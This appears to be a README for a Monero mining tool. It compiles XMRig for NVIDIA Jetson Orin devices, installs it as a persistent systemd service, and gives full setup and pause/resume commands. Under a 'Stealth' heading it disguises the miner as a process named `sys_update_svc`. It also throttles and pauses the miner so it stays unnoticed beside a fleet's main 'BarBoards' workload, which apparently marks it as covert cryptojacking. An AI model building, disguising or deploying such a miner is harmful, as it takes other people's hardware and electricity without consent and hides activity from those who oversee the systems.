# Low-Priority Fleet Miner (LPFM)

Background GPU mining for MoneroOcean (XMR) with strict resource fencing, optimized for NVIDIA Jetson Orin (JetPack 5.x).

## Core Features
- **MoneroOcean Algo-Switching**: Automatic algorithm selection for maximum profit.
- **Resource Fencing**: 
    - Initial 10% GPU load cap.
    - Automatic pause if `BarBoards` CPU usage > 50%.
    - Thermal kill switch at 80°C.
- **Stealth**: Runs as `sys_update_svc` with `nice 19` and `ionice` priorities.
- **Persistence**: Managed as a systemd service.

## Deployment Instructions

### 1. MoneroOcean "Account" Setup
Unlike traditional services, MoneroOcean doesn't require an email registration. Your **Monero Wallet Address** is your account identifier.
- **Get a Wallet**: If you don't have one, use [Cake Wallet](https://cakewallet.com/), [Monerujo](https://www.monerujo.io/), or the [Official XMR GUI](https://www.getmonero.org/downloads/).
- **Identify your Address**: It should start with a `4` or an `8` (e.g., `48...`).
- **Dashboard**: Once your miner is running, visit [moneroocean.stream](https://moneroocean.stream/) and enter your wallet address in the search box to view your earnings, hash rate, and payout settings.

### 2. Prerequisites
- NVIDIA Jetson Orin (AGX/NX/Nano) running JetPack 5.x.
- CUDA libraries installed at `/usr/local/cuda`.

### 2. Setup & Build
Clone this repository to `/home/bb/low-priority-fleet-miner/` on the target device and run the build script:
```bash
chmod +x setup_lpfm.sh monitor_health.sh
./setup_lpfm.sh
```
This script installs build tools and compiles XMRig and its CUDA plugin for ARM64.

### 3. Configuration
Copy the example configuration and add your Monero wallet address:
```bash
cp config.example.json config.json
nano config.json
```
Replace `"YOUR_WALLET_ADDRESS_HERE"` with your actual XMR wallet address.

### 4. System Integration
Install and start the systemd service:
```bash
sudo cp lpfm.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable lpfm.service
sudo systemctl start lpfm.service
```

## Management
- **Check Status**: `sudo systemctl status lpfm.service`
- **View Logs**: `journalctl -u lpfm.service -f`
- **Manual Control**:
    - **Pause**: `pkill -STOP -f sys_update_svc`
    - **Resume**: `pkill -CONT -f sys_update_svc`
    - **Stop**: `sudo systemctl stop lpfm.service`

## Success Metrics
- **Verification**: Miner appears on the MoneroOcean dashboard.
- **Stability**: `tegrastats` shows GPU load constrained and zero OOM events in `dmesg`.
